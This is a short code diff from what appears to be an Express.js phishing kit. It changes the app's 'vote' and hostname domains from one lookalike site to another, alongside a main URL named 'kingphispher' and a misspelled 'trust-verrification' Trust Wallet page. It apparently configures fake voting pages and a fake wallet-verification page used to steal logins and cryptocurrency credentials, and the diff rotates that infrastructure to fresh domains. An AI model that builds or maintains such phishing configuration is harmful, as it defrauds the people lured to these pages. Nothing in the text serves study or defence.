@@ -53,10 +53,10 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "www.kwikpolz.site";
-  req.app.voteUrl2 = "www.kwikpolz.site";
-  req.app.hostname1 = "www.kwikpolz.site";
-  req.app.hostname2 = "www.kwikpolz.site";
+  req.app.voteUrl = "www.swiftpols.site";
+  req.app.voteUrl2 = "www.swiftpols.site";
+  req.app.hostname1 = "www.swiftpols.site";
+  req.app.hostname2 = "www.swiftpols.site";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
